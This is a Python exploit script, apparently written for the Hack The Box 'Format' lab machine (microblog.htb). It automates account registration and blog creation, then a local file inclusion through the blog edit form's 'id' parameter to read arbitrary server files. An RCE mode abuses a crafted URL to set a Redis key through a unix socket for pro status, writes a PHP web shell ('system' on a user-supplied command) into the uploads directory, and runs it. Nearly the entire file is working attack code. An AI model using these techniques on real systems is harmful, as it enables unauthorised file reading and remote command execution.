#!/usr/bin/env python3

'''
Format HTB (LFI)
----------------
Description: Local file inclusion when editing a created blog
Author: Marss
Date: 28 Aug, 2023
'''

from argparse import ArgumentParser, RawDescriptionHelpFormatter
from python_hosts import Hosts, HostsEntry
from python_hosts.exception import UnableToWriteHosts
from random import choices
from re import findall
from requests import Session, request
from requests.exceptions import ConnectionError, ConnectTimeout
from signal import signal, SIGINT
from string import ascii_letters
from sys import argv

# Debuggin
import pdb

# Ctrl + c
signal(SIGINT, lambda signum, frame: exit('\n[-] User aborted.'))

# Main class
class Exploit:

    get_rand_str = lambda self, length: ''.join(choices(ascii_letters, k=length))

    def __init__(self, args):
        
        self.args = args
        self.target = {
            'ip': '10.10.11.213',
            'base_url': 'http://microblog.htb',
            'app_base_url': 'http://app.microblog.htb',
            'temp_data': self.get_rand_str(10)
        }
        # Session
        self.session = Session()
        # Proxies
        self.proxies = {'http':'http://127.1:8080'}

    def run(self):

        if self.target_response():
            self.register()
            self.login()
            self.create_blog()

            try:
                # Add blog domain to local hosts file
                blog_domain = self.target['blog_url'].split('http://')[1]
            
                local_hosts = self.add_domain_to_local(blog_domain)
                local_hosts.write()

                if self.args.mode == 'lfi':
                    self.local_file_inclusion()

                elif self.args.mode == 'rce':
                    self.activate_pro_user()
                    self.remote_code_execution()
            
            finally:
                # Remove blog domain from local hosts file
                local_hosts.remove_all_matching(name=blog_domain)
                local_hosts.write()
    
    def target_response(self) -> bool:

        try:
            response = self.session.get(self.target['app_base_url'], timeout=5)
            
            if response.ok:
                print(f'\n[+] Target up: {response.url}')
            
            return response.ok

        except ConnectTimeout:
            exit('\n[!] Verify VPN connection.')

        except ConnectionError:
            print(f'\n[x] Cannot resolve: {self.target["app_base_url"]}')
            exit('[!] Check the machine connection or resolve the specific domain on your local DNS server (/etc/hosts).')

    def register(self):

        try:
            rand_str = self.target['temp_data']
            print('\n[*] Temporary credentials: ' + rand_str)

            post_data = {
                'first-name': rand_str,
                'last-name': rand_str,
                'username': rand_str,
                'password': rand_str
            }

            response = self.session.post(self.target['app_base_url'] + '/register/index.php',
                data=post_data)

            if not 'Registration%20successful!' in response.url:
                print('\n[x] Registration Failed.')
                exit(1)

            print('[+] Successful Registration!')

        except Exception as error:
            exit('\n[-] Error: ' + repr(error))
        
    def login(self):

        try:
            rand_str = self.target['temp_data']

            post_data = {
                'username': rand_str,
                'password': rand_str
            }

            response = self.session.post(self.target['app_base_url'] + '/login/index.php',
                data=post_data)

            if 'Login%20failed' in response.url:
                print('\n[x] Login failed.')
                exit(1)

            print('[+] Successful Login!')

        except Exception as error:
            exit('\n[-] Error: ' + repr(error))

    def create_blog(self):

        try:
            rand_str = self.target['temp_data'].lower()

            post_data = {
                'new-blog-name': rand_str
            }

            response = self.session.post(self.target['app_base_url'] + '/dashboard/index.php',
                data=post_data)

            if not 'Site%20added%20successfully!' in response.url:
                print('\n[-] Failed to create the blog.')
                exit(1)

            self.target['blog_url'] = self.target['app_base_url'].replace('app', rand_str)
            print('[+] Site added: %s' % self.target['blog_url'])
        
        except Exception as error:
            exit('\n[-] Error: ' + repr(error))

    def add_domain_to_local(self, domain):

        try:
            local_hosts = Hosts()

            new_host = HostsEntry(
                entry_type='ipv4',
                address=self.target['ip'],
                names=[domain]
            )

            local_hosts.add([new_host], allow_address_duplication=True)

            return local_hosts

        except Exception as error:
            exit('\n[x] Error: ' + repr(error))

    def local_file_inclusion(self):
        
        try:
            post_data = {
                'id': self.args.file, # vulnerable parameter
                'header': ''
            }
            
            response = self.session.post(self.target['blog_url'] + '/edit/index.php',
                data=post_data,
                allow_redirects=False)

            file_content = findall(r'"<div class = .*?>(.*)<\\/div>"', response.text)[0].replace('\\/','/')
            escaped_file_content = file_content.encode('utf-8').decode('unicode-escape')

            if len(escaped_file_content) == 0 or '<b>' in escaped_file_content:
                print('\n[-] The path does not exist or we do not have permission to read that file.')
            else:
                print(f"\n{escaped_file_content}")

        except UnableToWriteHosts:
            print('\n[-] You have to run the script as root user.')
            exit(1)
        except Exception as error:
            exit('\n[-] Error: ' + repr(error))

    def activate_pro_user(self):

        try:
            
            redis_socket = '/unix:%2fvar%2frun%2fredis%2fredis.sock:'
            key_data = '%20'.join([self.target['temp_data'],'pro','true','%20'])
            
            crafted_url = self.target['base_url'] + '/static' + redis_socket + key_data + '/any'
            request('HSET', crafted_url)
            
            response = self.session.get(self.target['app_base_url'] + '/dashboard')
            
            if not 'Pro' in response.text:
                print('\n[x] Failed to upgrade user.')
                exit(1)
            
            print('[+] Pro user: Activated.')
            
        except ConnectionError:
            print(f'\n[x] Cannot resolve: {self.target["base_url"]}')
            exit('[!] Check the machine connection or resolve the specific domain on your local DNS server (/etc/hosts).')

    def remote_code_execution(self):

        try:
            file_name = blog_dir = self.target['temp_data'].lower()
            file_path = f"/var/www/microblog/{blog_dir}/uploads/{file_name}.php"
            file_content = f'<?php system("{self.args.command}"); ?>'
            post_data = {
                'id': file_path,
                'header': file_content
            }
            
            response = self.session.post(self.target['blog_url'] + '/edit/index.php',
                data=post_data)
            
            if not 'Section%20added!' in response.url:
                print('\n[x] Error creating file.')
                exit(1)

            print('[+] Web shell created.')

            response = self.session.get(self.target['blog_url'] + f'/uploads/{file_name}.php')
            output_command = findall(r'<b>((?:.*\s)+)</b>', response.text)[0]
            
            print(f'\n{output_command}')

        except IndexError:
            exit('\n[-] Invalid command.')
        except Exception as error:
            exit('\n[-] Error: ' + repr(error))

# Main flow
if __name__ == '__main__':

    title = '\n| Format HTB (LFI && RCE) |'

    parser = ArgumentParser(
        formatter_class=RawDescriptionHelpFormatter,
        epilog='''Example:
        sudo env/bin/python3 %s lfi -f ""/etc/hosts"
        sudo -E env PATH=${PATH} python3 %s lfi -f "/etc/hosts"
        (sudo console) python3 %s lfi -f "/etc/hosts"
        sudo env/bin/python3 %s rce -c "id"
        ''' % (argv[0], argv[0], argv[0], argv[0]))

    subparsers = parser.add_subparsers(dest='mode', required=True)
    
    lfi_parser = subparsers.add_parser('lfi', help='LFI mode')
    lfi_parser.add_argument('-f', '--file', type=str, required=True, help='File to read')

    rce_parser = subparsers.add_parser('rce', help='RCE mode')
    rce_parser.add_argument('-c', '--command', type=str, required=True, help='Command to execute')

    args = parser.parse_args()

    print(title)

    exploit = Exploit(args)
    exploit.run()